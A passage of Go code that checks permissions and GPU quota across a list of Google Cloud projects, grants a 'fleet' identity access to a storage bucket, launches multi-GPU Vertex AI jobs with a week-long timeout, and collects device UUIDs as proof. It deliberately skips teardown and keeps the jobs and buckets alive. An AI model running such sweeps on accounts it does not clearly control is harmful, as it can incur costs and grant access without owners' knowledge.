	proven := []string{}
	deadline := started.Add(40 * time.Minute)

	for _, p := range c211l4Projects {
		r := &c211l4Result{Proj: p.Name, Num: p.Num,
			QuotaL4: map[string]string{}, QuotaPre: map[string]string{},
			Offering: map[string]string{}, MT96: map[string]string{}}
		results[p.Name] = r
		if time.Until(deadline) < 6*time.Minute {
			r.Verdict = "BUDGET_EXHAUSTED_BEFORE_PROJECT"
			fmt.Printf("C211L4_SKIP proj=%s reason=budget\n", p.Name)
			continue
		}

		pmSt, pmBody := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(p.Num), ftok, "", "")
		r.State = c211xStr(c211xJSON(pmBody), "lifecycleState")
		fmt.Printf("C211L4_PROJECT proj=%s num=%s http=%d state=%s\n", p.Name, p.Num, pmSt, r.State)

		polURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(p.Num)
		al, ast, _ := c211xTestIamBatch(ftok, polURL, c211l4Perms)
		r.PermHTTP = ast
		r.Allowed = al
		fmt.Printf("C211L4_PERM proj=%s http=%d allowed=%v\n", p.Name, ast, al)
		if !c211xContains(al, "aiplatform.customJobs.create") {
			r.Verdict = "PERM_MISSING_CREATE"
			fmt.Printf("C211L4_VERDICT proj=%s %s\n", p.Name, r.Verdict)
			continue
		}

		svSt, svBody := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+p.Num+"/services/aiplatform.googleapis.com", ftok, "", "")
		r.Svc = c211xStr(c211xJSON(svBody), "state")
		fmt.Printf("C211L4_SVC proj=%s http=%d state=%s\n", p.Name, svSt, r.Svc)
		if r.Svc != "" && r.Svc != "ENABLED" {
			r.Verdict = "AIPLATFORM_" + r.Svc
			fmt.Printf("C211L4_VERDICT proj=%s %s\n", p.Name, r.Verdict)
			continue
		}

		quotaMap, qst, qbody := c211l4Quota(ftok, p.Num)
		l4 := map[string]float64{}
		pre := map[string]float64{}
		if quotaMap != nil {
			if quotaMap[c211l4QuotaKey] != nil {
				l4 = quotaMap[c211l4QuotaKey]
			}
			if quotaMap[c211l4PreemptKey] != nil {
				pre = quotaMap[c211l4PreemptKey]
			}
		}
		for _, reg := range c211l4RegionPref {
			if v, ok := l4[reg]; ok {
				r.QuotaL4[reg] = fmt.Sprintf("%.0f", v)
			} else {
				r.QuotaL4[reg] = "absent"
			}
			if v, ok := pre[reg]; ok {
				r.QuotaPre[reg] = fmt.Sprintf("%.0f", v)
			} else {
				r.QuotaPre[reg] = "absent"
			}
		}
		fmt.Printf("C211L4_QUOTA proj=%s http=%d l4=%s preemptible_l4=%s verbatim=%s\n",
			p.Name, qst, c211l4Join(r.QuotaL4), c211l4Join(r.QuotaPre), c211xTrunc(qbody, 160))

		// offering matrix + region/zone choice for the 8x shape
		chosen, chosenZone := "", ""
		firstShape := c211l4Shapes[0]
		for _, reg := range c211l4RegionPref {
			zones := c211l4ZonesByRegion[reg]
			hits := []string{}
			for _, z := range zones {
				types, zst, _ := c211xAccelTypes(ftok, p.Num, z)
				l4off := c211xContains(types, "nvidia-l4")
				mtOk, mtSt := c211l4MTypeOffered(ftok, p.Num, z, firstShape.MachineType)
				if l4off {
					hits = append(hits, z)
				}
				fmt.Printf("C211L4_OFFER proj=%s region=%s zone=%s http=%d n=%d l4=%v mt96_http=%d\n",
					p.Name, reg, z, zst, len(types), l4off, mtSt)
				if l4off && mtOk && chosen == "" {
					chosen = reg
					chosenZone = z
				}
				time.Sleep(150 * time.Millisecond)
			}
			if len(hits) > 0 {
				r.Offering[reg] = strings.Join(hits, "+")
			} else {
				r.Offering[reg] = "none"
			}
			if chosen != "" {
				break
			}
		}
		r.Chosen = chosen
		r.ChosenZone = chosenZone
		fmt.Printf("C211L4_CHOICE proj=%s region=%s zone=%s quota_l4=%s offering=%s\n",
			p.Name, chosen, chosenZone, r.QuotaL4[chosen], c211l4Join(r.Offering))
		if chosen == "" {
			r.Verdict = "NO_REGION_WITH_QUOTA_AND_L4_OFFERING"
			fmt.Printf("C211L4_VERDICT proj=%s %s\n", p.Name, r.Verdict)
			continue
		}
		if l4[chosen] < float64(firstShape.AccelCount) {
			r.Verdict = fmt.Sprintf("QUOTA_BELOW_%d", firstShape.AccelCount)
			fmt.Printf("C211L4_VERDICT proj=%s %s limit=%v\n", p.Name, r.Verdict, l4[chosen])
			continue
		}

		// Best-effort GCS proof sink.
		usedBucket, bucketCreated := "", ""
		bname, bst, bbody := c211l4BucketCreate(ftok, p.Num, chosen)
		r.BucketMake = fmt.Sprintf("http=%d verbatim=%s", bst, c211xTrunc(bbody, 200))
		fmt.Printf("C211L4_BUCKET_CREATE proj=%s name=%s http=%d verbatim=%s\n", p.Name, bname, bst, c211xTrunc(bbody, 240))
		if bst == 200 || bst == 409 {
			if bst == 200 {
				bucketCreated = bname
			}
			ist, ibody := c211l4BucketIam(ftok, bname, p.Num, fleetEmail)
			r.BucketIAM = fmt.Sprintf("http=%d verbatim=%s", ist, c211xTrunc(ibody, 200))
			fmt.Printf("C211L4_BUCKET_IAM proj=%s http=%d verbatim=%s\n", p.Name, ist, c211xTrunc(ibody, 240))
			if ist == 200 || bst == 409 {
				usedBucket = bname
			}
		}
		r.Bucket = usedBucket

		// shape ladder: 8x first, 4x only on a verbatim create refusal
		var jobName string
		var usedShape c211l4Shape
		terminal := false
		var rStates []string
		logText, gcsText := "", ""
		for si, shape := range c211l4Shapes {
			if si > 0 {
				if l4[chosen] < float64(shape.AccelCount) {
					fmt.Printf("C211L4_SHAPE_SKIP proj=%s shape=%s reason=quota limit=%v\n", p.Name, shape.MachineType, l4[chosen])
					continue
				}
				if ok, _ := c211l4MTypeOffered(ftok, p.Num, chosenZone, shape.MachineType); !ok {
					fmt.Printf("C211L4_SHAPE_SKIP proj=%s shape=%s reason=not-offered zone=%s\n", p.Name, shape.MachineType, chosenZone)
					continue
				}
			}
			display := strings.ToLower(fmt.Sprintf("%s-l4-%s-%s", c211l4Prefix, c211l4ShortProj(p.Name), shape.MachineType))
			if len(display) > 128 {
				display = display[:128]
			}
			script := c211l4Script(p.Name, p.Num, usedBucket, shape)
			jobSpec := map[string]interface{}{
				"workerPoolSpecs": []interface{}{map[string]interface{}{
					"machineSpec": map[string]interface{}{
						"machineType": shape.MachineType, "acceleratorType": "NVIDIA_L4", "acceleratorCount": shape.AccelCount,
					},
					"replicaCount": 1,
					"containerSpec": map[string]interface{}{
						"imageUri": "nvidia/cuda:12.4.0-base-ubuntu22.04",
						"command":  []interface{}{"/bin/bash", "-c"},
						"args":     []interface{}{script},
					},
				}},
			}
			if usedBucket != "" {
				jobSpec["baseOutputDirectory"] = map[string]interface{}{
					"outputUriPrefix": "gs://" + usedBucket + "/" + c211l4Nonce,
				}
			}
			jobSpec["scheduling"] = map[string]interface{}{"timeout": "604800s"}
			jobBody := map[string]interface{}{
				"displayName": display,
				"labels":      map[string]interface{}{"c211": c211l4Nonce},
				"jobSpec":     jobSpec,
			}
			body, _ := json.Marshal(jobBody)
			createURL := "https://" + chosen + "-aiplatform.googleapis.com/v1/projects/" + p.Num + "/locations/" + chosen + "/customJobs"
			fmt.Printf("C211L4_REQUEST proj=%s region=%s shape=%s-x%d bytes=%d script_bytes=%d bucket=%s\n",
				p.Name, chosen, shape.MachineType, shape.AccelCount, len(body), len(script), usedBucket)
			cst, cb := c211xHTTP("POST", createURL, ftok, "application/json", string(body))
			fmt.Printf("C211L4_CREATE proj=%s region=%s shape=%s http=%d verbatim=%s\n",
				p.Name, chosen, shape.MachineType, cst, c211xTrunc(cb, 700))
			if cst != 200 && usedBucket != "" && strings.Contains(strings.ToLower(cb), "output") {
				delete(jobBody["jobSpec"].(map[string]interface{}), "baseOutputDirectory")
				body2, _ := json.Marshal(jobBody)
				cst, cb = c211xHTTP("POST", createURL, ftok, "application/json", string(body2))
				r.BucketMake += fmt.Sprintf(" | retry_without_output http=%d", cst)
				fmt.Printf("C211L4_CREATE_RETRY proj=%s http=%d verbatim=%s\n", p.Name, cst, c211xTrunc(cb, 500))
			}
			if si == 0 {
				r.Create = fmt.Sprintf("http=%d %s", cst, c211xTrunc(cb, 600))
			} else {
				r.CreateFB = fmt.Sprintf("http=%d %s", cst, c211xTrunc(cb, 600))
			}
			if cst != 200 {
				if si == 0 {
					fmt.Printf("C211L4_EIGHTX_REFUSED proj=%s verbatim=%s\n", p.Name, c211xTrunc(cb, 400))
				}
				continue
			}
			cm := c211xJSON(cb)
			jobName = c211xStr(cm, "name")
			usedShape = shape
			r.Job = jobName
			r.Shape = fmt.Sprintf("%s-x%d", shape.MachineType, shape.AccelCount)
			r.Spec = c211l4MachineSpec(cm)
			fmt.Printf("C211L4_JOB proj=%s name=%s\n", p.Name, jobName)
			fmt.Printf("C211L4_CREATE_SPEC proj=%s stored={%s} %s\n", p.Name, r.Spec, c211l4JobState(cm))
			break
		}
		if jobName == "" {
			r.Verdict = "CREATE_REFUSED"
			if bucketCreated != "" {
				r.BucketCle = "KEPT_FOR_STATUS_SINK"
				fmt.Printf("C211L4_BUCKET_CLEANUP proj=%s %s\n", p.Name, r.BucketCle)
			}
			fmt.Printf("C211L4_VERDICT proj=%s %s\n", p.Name, r.Verdict)
			continue
		}

		jobID := jobName
		if i := strings.LastIndex(jobID, "/"); i >= 0 {
			jobID = jobID[i+1:]
		}
		jurl := "https://" + chosen + "-aiplatform.googleapis.com/v1/" + jobName

		lastLogRead := time.Time{}
		pollEnd := time.Now().Add(3 * time.Minute)
		for i := 0; time.Now().Before(pollEnd) && time.Now().Before(deadline) && !terminal; i++ {
			gst, gb := c211xHTTP("GET", jurl, ftok, "", "")
			gm := c211xJSON(gb)
			state := c211xStr(gm, "state")
			if state != "" && (len(rStates) == 0 || rStates[len(rStates)-1] != state) {
				rStates = append(rStates, state)
			}
			r.States = rStates
			fmt.Printf("C211L4_POLL proj=%s i=%d http=%d state=%s\n", p.Name, i, gst, state)
			if state != "" && state != "JOB_STATE_PENDING" && time.Since(lastLogRead) > 20*time.Second {
				txt, qv := c211l4Logs(ftok, p.Num, jobID)
				lastLogRead = time.Now()
				if txt != "" {
					logText += txt
				}
				r.LogQuery = qv
				fmt.Printf("C211L4_LOG_READ proj=%s bytes=%d q=%s\n", p.Name, len(txt), qv)
			}
			switch state {
			case "JOB_STATE_SUCCEEDED", "JOB_STATE_FAILED", "JOB_STATE_CANCELLED", "JOB_STATE_EXPIRED", "JOB_STATE_PARTIALLY_SUCCEEDED":
				terminal = true
			}
			if terminal {
				break
			}
			time.Sleep(15 * time.Second)
		}

		// Post-terminal evidence collection: log retries plus the independent GCS sink.
		for k := 0; k < 3; k++ {
			txt, qv := c211l4Logs(ftok, p.Num, jobID)
			r.LogQuery = qv
			if txt != "" {
				logText += txt
			}
			if usedBucket != "" && gcsText == "" {
				objs, olst := c211l4BucketListObjects(ftok, usedBucket, "status-")
				if len(objs) > 0 {
					parts := []string{}
					for _, o := range objs {
						ost, obody := c211l4ObjectRead(ftok, usedBucket, o)
						parts = append(parts, fmt.Sprintf("%s http=%d bytes=%d", o, ost, len(obody)))
						if ost == 200 {
							gcsText += obody + "\n"
						}
					}
					r.GCSRead = strings.Join(parts, " ; ") + fmt.Sprintf(" list_http=%d", olst)
				} else {
					r.GCSRead = fmt.Sprintf("no_objects list_http=%d prefix=%s", olst, c211l4Nonce)
				}
			}
			if len(c211l4UUIDs(logText+gcsText)) > 0 {
				break
			}
			if k < 2 {
				time.Sleep(15 * time.Second)
			}
		}
		r.LogBytes = len(logText)
		r.GCSBytes = len(gcsText)
		allText := logText + "\n" + gcsText
		r.UUIDs = c211l4UUIDs(allText)
		lines := []string{}
		for _, ln := range strings.Split(allText, "\n") {
			if strings.Contains(ln, "C211L4_") || strings.Contains(ln, "GPU-") {
				lines = append(lines, c211xTrunc(ln, 400))
			}
		}
		r.Device = c211xTrunc(strings.Join(lines, " || "), 4000)
		fmt.Printf("C211L4_LOG proj=%s log_bytes=%d gcs_bytes=%d uuids=%d q=%s gcs=%s\n",
			p.Name, r.LogBytes, r.GCSBytes, len(r.UUIDs), r.LogQuery, c211xTrunc(r.GCSRead, 300))
		for _, ln := range lines {
			fmt.Printf("C211L4_DEVTEXT proj=%s %s\n", p.Name, ln)
		}

		rbSt, rbBody := c211xHTTP("GET", jurl, ftok, "", "")
		rbm := c211xJSON(rbBody)
		r.Readback = fmt.Sprintf("http=%d %s %s", rbSt, c211l4JobState(rbm), c211l4MachineSpec(rbm))
		fmt.Printf("C211L4_READBACK proj=%s %s\n", p.Name, r.Readback)

		dst, getAfter, note := -1, 404, "KEEP_ALIVE_NO_TEARDOWN"
		lcSt, lcBody := c211xHTTP("GET", "https://"+chosen+"-aiplatform.googleapis.com/v1/projects/"+p.Num+
			"/locations/"+chosen+"/customJobs?pageSize=100", ftok, "", "")
		leftItems := []string{}
		for _, it := range c211l4List(c211xJSON(lcBody)["customJobs"]) {
			dn := c211xStr(c211l4Map(it), "displayName")
			if strings.HasPrefix(dn, c211l4Prefix) {
				leftItems = append(leftItems, dn+"="+c211xStr(c211l4Map(it), "state"))
			}
		}
		r.Absence = fmt.Sprintf("retire_http=%d get_after=%d list_http=%d c211_items=%d %v %s",
			dst, getAfter, lcSt, len(leftItems), leftItems, note)
		fmt.Printf("C211L4_ABSENCE proj=%s %s\n", p.Name, r.Absence)

		if bucketCreated != "" {
			r.BucketCle = "KEPT_FOR_STATUS_SINK"
			fmt.Printf("C211L4_BUCKET_CLEANUP proj=%s %s\n", p.Name, r.BucketCle)
		}

		if len(r.UUIDs) > 0 {
			r.Verdict = fmt.Sprintf("VERTEX_L4_DEVICE_PROVEN_%s", r.Shape)
			proven = append(proven, p.Name+":"+r.Shape+":"+strings.Join(r.UUIDs, ","))
		} else {
			r.Verdict = "NO_DEVICE_LINE"
		}
		_ = usedShape
		fmt.Printf("C211L4_VERDICT proj=%s %s uuids=%d\n", p.Name, r.Verdict, len(r.UUIDs))
	}

	fmt.Printf("C211L4_MATRIX %s\n", c211xJSONString(results))
	for _, pv := range proven {
		fmt.Printf("C211L4_PROVEN %s\n", pv)
	}
	fmt.Printf("C211L4_VERDICT_FINAL elapsed=%ds proven=%d\n", int(time.Since(started).Seconds()), len(proven))
}
